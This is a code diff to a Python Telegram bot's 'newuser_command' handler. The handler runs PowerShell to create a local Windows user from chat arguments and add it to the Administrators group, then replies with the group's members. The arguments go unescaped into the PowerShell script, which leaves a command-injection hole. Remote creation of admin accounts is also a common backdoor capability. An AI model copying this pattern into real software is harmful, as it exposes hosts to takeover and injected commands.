@@ -104,13 +104,16 @@ async def newuser_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     try:
-        get_adminRights()
-        run_powershell_command(f'$Password = ConvertTo-SecureString -AsPlainText {context.args[1]} -Force')
-        commandOutput1 =  run_powershell_command(f'New-LocalUser -Name "{context.args[0]}" -Password $Password')
-        run_powershell_command(f'Add-LocalGroupMember -Group "Administrators" -Member "{context.args[0]}"')
+        add_new_user = f'''
+        $Password = ConvertTo-SecureString -AsPlainText "{context.args[1]}" -Force;
+        New-LocalUser -Name "{context.args[0]}" -Password $Password;
+        Add-LocalGroupMember -Group "Administrators" -Member "{context.args[0]}";
+        '''
+        run_powershell_command(add_new_user, True)
         
-        commandOutput2 = run_powershell_command('Get-LocalGroupMember -Group "Administrators"')
-        await update.message.reply_text(f"Terminal output:```\n{commandOutput1}\n{commandOutput2}\n```", parse_mode='MarkdownV2')
+        commandOutput = run_powershell_command('Get-LocalGroupMember -Group "Administrators"')
+        await update.message.reply_text(f"Terminal output:```\n{commandOutput}\n```", parse_mode='MarkdownV2')
+
     except ValueError:
         await update.message.reply_text(f"Er is een fout opgetreden bij het uitvoeren: {ValueError}")
 
